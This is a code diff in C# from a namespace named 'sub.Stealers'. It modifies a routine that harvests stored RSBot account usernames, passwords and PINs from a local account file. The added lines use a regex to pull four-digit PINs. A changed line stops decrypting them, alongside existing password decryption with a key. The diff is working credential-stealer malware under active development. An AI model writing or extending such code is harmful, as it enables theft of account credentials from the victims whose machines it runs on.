@@ -55,6 +55,10 @@ namespace sub.Stealers
 
         private IEnumerable<RSBotAccount> GetLocalAccounts(string accountFileData, byte[] key)
         {
+            //TODO: Make these line up.
+            //If there are two accounts and only the second has a pin
+            //It will show the pin for the first account
+            //This happens with passwords too
             ArrayList usernames = new ArrayList();
             ArrayList passwords = new ArrayList();
             ArrayList pins = new ArrayList();
@@ -73,6 +77,13 @@ namespace sub.Stealers
                 passwords.Add(m.Value);
             }
 
+            Regex pinpat = new Regex(@"(?<=pin\=)[0-9]{4}");
+            MatchCollection pinmatches = pinpat.Matches(accountFileData);
+            foreach (Match m in pinmatches)
+            {
+                pins.Add(m.Value);
+            }
+
             List<RSBotAccount> ret = new List<RSBotAccount>();
             foreach (string user in usernames)
             {
@@ -80,7 +91,7 @@ namespace sub.Stealers
                 const string emp = "None";
 
                 string pass = idx < passwords.Count ? DecryptPassword(passwords[idx].ToString(), key) : emp;
-                string pin = idx < pins.Count ? DecryptPassword(pins[idx].ToString(), key) : emp;
+                string pin = idx < pins.Count ? pins[idx].ToString() : emp;
                 if (string.IsNullOrEmpty(pass) && pass != emp)
                 {
                     pass = DecryptPassword(pass, key);
